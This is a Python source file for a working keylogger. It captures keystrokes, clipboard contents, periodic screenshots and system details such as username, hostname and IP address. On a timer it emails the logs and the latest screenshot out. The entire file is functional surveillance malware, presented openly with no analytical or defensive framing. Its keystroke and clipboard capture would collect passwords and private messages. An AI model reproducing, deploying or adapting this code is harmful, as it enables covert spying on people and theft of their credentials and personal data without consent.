import os
import socket
import platform
import time
import json
import threading
import datetime
import getpass
from pynput import keyboard
import pyperclip
import pyscreenshot as ImageGrab
from email_sender import send_email
import logging
import glob


# === Create logs directory ===
log_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "logs")
os.makedirs(log_dir, exist_ok=True)

# === Load Configuration ===
try:
    with open("logger_config.json", "r") as f:
        log_cfg = json.load(f)
except FileNotFoundError:
    log_cfg = {}
except json.JSONDecodeError as e:
    print(f"Error loading logger_config.json: {e}")
    log_cfg = {}

try:
    with open("config.json", "r") as f:
        email_cfg = json.load(f)
except FileNotFoundError:
    email_cfg = {}
except json.JSONDecodeError as e:
    print(f"Error loading config.json: {e}")
    email_cfg = {}

# === Configuration Settings ===
log_level = log_cfg.get("log_level", "INFO").upper()
log_format = log_cfg.get("log_format", "%(asctime)s - %(levelname)s - %(message)s")
screenshot_enabled = log_cfg.get("screenshot_enabled", True)
screenshot_interval = log_cfg.get("screenshot_interval_seconds", 60)
clipboard_enabled = log_cfg.get("clipboard_logging_enabled", True)
clipboard_interval = log_cfg.get("clipboard_interval_seconds", 10)
keystroke_enabled = log_cfg.get("log_keystrokes", True)
system_info_enabled = log_cfg.get("include_system_info", True)
email_interval = email_cfg.get("interval_minutes", 3) * 60

# === Setup Logging ===
timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
log_file = os.path.join(log_dir, f"log_{timestamp}.txt")

logger = logging.getLogger("KeyLogger")
logger.setLevel(getattr(logging, log_level, logging.INFO))

# File handler
file_handler = logging.FileHandler(log_file)
file_handler.setLevel(getattr(logging, log_level, logging.INFO))

# Console handler (optional)
console_handler = logging.StreamHandler()
console_handler.setLevel(logging.ERROR)  # Only show errors in console

# Formatter
formatter = logging.Formatter(log_format)
file_handler.setFormatter(formatter)
console_handler.setFormatter(formatter)

# Add handlers
logger.addHandler(file_handler)
logger.addHandler(console_handler)

logger.info("=== Keylogger Started ===")

# === System Info Logging ===
def log_system_info():
    try:
        info = {
            "User": getpass.getuser(),
            "Hostname": socket.gethostname(),
            "IP": socket.gethostbyname(socket.gethostname()),
            "OS": platform.system(),
            "OS Version": platform.version(),
            "Processor": platform.processor(),
            "Start Time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        for k, v in info.items():
            logger.info(f"{k}: {v}")
    except Exception as e:
        logger.error(f"System info error: {e}")

# === Clipboard Logger ===
def clipboard_worker():
    logger.info("Clipboard logger started")
    last = ""
    while clipboard_enabled:
        try:
            cur = pyperclip.paste()
            if cur and cur != last:
                last = cur
                # Truncate long clipboard content
                logged_content = cur if len(cur) < 500 else cur[:500] + "...[truncated]"
                logger.info(f"[CLIPBOARD] {logged_content}")
        except Exception as e:
            logger.error(f"Clipboard error: {e}")
        time.sleep(clipboard_interval)

# === Screenshot Logger ===
def screenshot_worker():
    screenshots_dir = os.path.join(log_dir, "screenshots")
    os.makedirs(screenshots_dir, exist_ok=True)
    logger.info("Screenshot logger started")
    
    while screenshot_enabled:
        try:
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
            fname = os.path.join(screenshots_dir, f"screen_{timestamp}.png")
            img = ImageGrab.grab()
            img.save(fname)
            logger.info(f"[SCREENSHOT] Saved: {os.path.basename(fname)}")
        except Exception as e:
            logger.error(f"Screenshot error: {e}")
        time.sleep(screenshot_interval)

# === Keystroke Logger ===
key_buffer = ""
MAX_BUFFER_LENGTH = 200  # Prevent memory issues with long buffers

def on_press(key):
    global key_buffer
    try:
        char = None
        if hasattr(key, 'char') and key.char is not None:
            char = key.char
        elif key == keyboard.Key.space:
            char = ' '
        elif key == keyboard.Key.enter:
            char = '\n'
        elif key == keyboard.Key.tab:
            char = '\t'
        elif key == keyboard.Key.backspace:
            if len(key_buffer) > 0:
                key_buffer = key_buffer[:-1]
            return
        else:
            # For special keys, log their name
            logger.info(f"[SPECIAL_KEY] {key}")
            return

        if char is not None:
            key_buffer += char
            # Log when buffer gets too long or when we hit enter
            if len(key_buffer) > MAX_BUFFER_LENGTH or char == '\n':
                if key_buffer.strip():
                    logger.info(f"[KEYLOG] {key_buffer.strip()}")
                key_buffer = ""
                
    except Exception as e:
        logger.error(f"Keystroke error: {e}")

def keystroke_worker():
    logger.info("Keystroke logger started")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# === Email Scheduler ===
def email_worker():
    logger.info("Email worker started")
    while True:
        time.sleep(email_interval)
        try:
            attachments = [log_file]
            
            # Find latest screenshot if enabled
            if screenshot_enabled:
                screenshots_dir = os.path.join(log_dir, "screenshots")
                screenshot_files = glob.glob(os.path.join(screenshots_dir, "*.png"))
                if screenshot_files:
                    latest_screenshot = max(screenshot_files, key=os.path.getctime)
                    attachments.append(latest_screenshot)

            send_email(
                subject=f"Keylogger Report - {datetime.datetime.now().strftime('%Y-%m-%d %H:%M')}",
                body="Attached are the latest keylogger logs and screenshot.",
                attachment_path=attachments
            )
            logger.info("Email with logs and screenshot sent successfully")
        except Exception as e:
            logger.error(f"Email send error: {e}")

# === Main Runner ===
def main():
    if system_info_enabled:
        log_system_info()

    threads = []
    
    # Start background workers
    if keystroke_enabled:
        t = threading.Thread(target=keystroke_worker, daemon=True)
        t.start()
        threads.append(t)
        
    if clipboard_enabled:
        t = threading.Thread(target=clipboard_worker, daemon=True)
        t.start()
        threads.append(t)
        
    if screenshot_enabled:
        t = threading.Thread(target=screenshot_worker, daemon=True)
        t.start()
        threads.append(t)
    
    # Start email scheduler
    t = threading.Thread(target=email_worker, daemon=True)
    t.start()
    threads.append(t)

    # Keep main thread alive
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        logger.info("Keylogger stopped by user.")
    except Exception as e:
        logger.error(f"Main thread error: {e}")
    finally:
        logger.info("=== Keylogger Stopped ===")

if __name__ == "__main__":
    main()